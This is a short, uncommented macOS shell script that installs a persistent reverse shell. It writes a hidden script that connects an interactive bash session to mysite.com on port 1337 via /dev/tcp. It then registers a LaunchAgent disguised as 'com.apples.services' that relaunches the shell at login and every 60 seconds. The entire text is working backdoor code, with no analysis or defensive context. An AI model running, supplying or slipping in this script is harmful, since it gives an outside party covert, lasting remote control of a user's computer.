mkdir ~/Library/.hidden
echo '#!/bin/bash
bash -i >& /dev/tcp/mysite.com/1337 0>&1
wait' > ~/Library/.hidden/connect.sh
chmod +x ~/Library/.hidden/connect.sh
mkdir ~/Library/LaunchAgents
echo '<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apples.services</string>
<key>ProgramArguments</key>
<array>
<string>/bin/sh</string>
<string>'$HOME'/Library/.hidden/connect.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
<key>StartInterval</key>
<integer>60</integer>
<key>AbandonProcessGroup</key>
<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.apples.services.plist
chmod 600 ~/Library/LaunchAgents/com.apples.services.plist
launchctl load ~/Library/LaunchAgents/com.apples.services.plist